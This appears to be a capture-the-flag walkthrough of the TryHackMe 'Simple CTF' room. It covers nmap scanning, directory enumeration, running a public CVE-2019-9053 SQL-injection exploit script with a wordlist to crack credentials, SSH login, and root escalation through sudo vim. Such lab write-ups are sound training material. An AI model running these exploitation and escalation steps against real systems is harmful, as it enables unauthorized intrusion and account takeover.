# Simple CTF

[Room Link](https://tryhackme.com/room/easyctf)

`nmap -A -O -sV -vv -T4 10.10.162.112`

Nmap as usual

![image](https://github.com/user-attachments/assets/c39d56ff-93c5-44f3-a235-c4e2977acfa6)

There's a webpage, lurked around but couldn't find anything useful

```
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.39.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

Nmap results show that there are ftp, http and ssh ports open
I tried to look for any exploits for `Apache httpd 2.4.18 ((Ubuntu))` but unfortunately couldn't find any

So I explored the directories of the webpage using dirbuster

![image](https://github.com/user-attachments/assets/8591c106-03e6-48b2-99be-feeda5a12963)

We see that /simple has got all the directories

![image](https://github.com/user-attachments/assets/efb5e5b5-af7f-4f53-a6c8-f27fda7a6999)

![image](https://github.com/user-attachments/assets/35e83c89-177a-4c34-b522-7c6d8d7a686c)

searching for `CMS Made Simple 2.2.8 exploits`

Will lead to

https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3

```
CVE-2019-9053 is a Time-Based Blind SQLi vulnerability which enables the attacker to enumerate the database extracting informatiaon by monitoring delays in the responses of the application. The vulnerability is present in versions of CMSMS equal to or below 2.2.9.
```

![image](https://github.com/user-attachments/assets/fc1368fd-0b4a-4c94-b135-b16616d9befa)

`python3 csm_made_simple_injection.py -u http://10.10.162.112/simple/ -t 4 -c -w /usr/share/wordlists/rockyou.txt ` will help cracking the username and password

![image](https://github.com/user-attachments/assets/6ab0030c-b972-4320-8e16-412fe1ed58da)


Since other than http, there is ssh, which is accessible using the given username and password

`ssh mitch@10.10.162.112 -p 2222`

![image](https://github.com/user-attachments/assets/929a9b5d-2fb2-4d99-a1bb-fa885f852e7b)

That's our user key

now for the root key, we need sudo privileges

![image](https://github.com/user-attachments/assets/35818412-1e83-4595-bf2c-b192dd8d0c93)

now to escalate using vim, we take help of [GTFObins](https://gtfobins.github.io/gtfobins/vim/#shell)

![image](https://github.com/user-attachments/assets/827d1dda-4dc9-45ff-ab18-13c34fa4659e)

![image](https://github.com/user-attachments/assets/9c32c162-1e73-4a53-ab6e-ac1a87f7aa2f)

got all privileges, time for root flag

![image](https://github.com/user-attachments/assets/41252838-7e22-4804-90f7-9bcd30d77855)















